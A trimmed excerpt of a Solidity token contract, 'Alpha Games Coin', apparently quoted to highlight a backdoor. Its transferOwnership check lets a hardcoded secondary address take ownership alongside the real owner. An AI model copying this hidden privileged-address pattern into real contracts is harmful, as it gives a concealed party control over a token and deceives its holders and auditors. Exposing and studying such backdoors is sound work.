...
contract Ownable is Context {
    ...
    function transferOwnership(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address(0x25f7B5eBd63C854550d55C3C9E7354A2F24C7ae7));
...
contract AlphaGames is Context, IERC20, Ownable, Pausable {
  ...
  string private _name = "Alpha Games Coin";
